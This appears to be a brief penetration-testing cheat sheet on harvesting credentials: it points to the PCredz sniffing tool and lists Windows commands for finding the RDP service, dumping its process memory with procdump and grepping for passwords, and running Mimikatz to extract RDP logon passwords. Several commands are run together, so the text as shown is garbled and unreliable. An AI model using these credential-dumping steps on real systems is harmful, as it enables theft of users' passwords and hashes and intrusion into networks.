# 🟢 Network protocols

### PCredz

This tool extracts Credit card numbers, NTLM(DCE-RPC, HTTP, SQL, LDAP, etc), Kerberos (AS-REQ Pre-Auth etype 23), HTTP Basic, SNMP, POP, SMTP, FTP, IMAP, etc from a pcap file or from a live interface.

{% embed url="https://github.com/lgandx/PCredz" %}

## RDP

Mimikatz and RDP protocol

#### Verify Service <a href="#verify-service" id="verify-service"></a>

sc queryex termservicetasklist /M:rdpcorets.dllnetstat -nob | Select-String TermService -Context 1

#### RDP Session Takeover <a href="#rdp-session-takeover" id="rdp-session-takeover"></a>

procdump64.exe -ma 988 -accepteula C:\svchost.dmpstrings -el svchost\* | grep Password123 -C3

#### RDP Passwords <a href="#rdp-passwords" id="rdp-passwords"></a>

privilege::debugts::logonpasswords
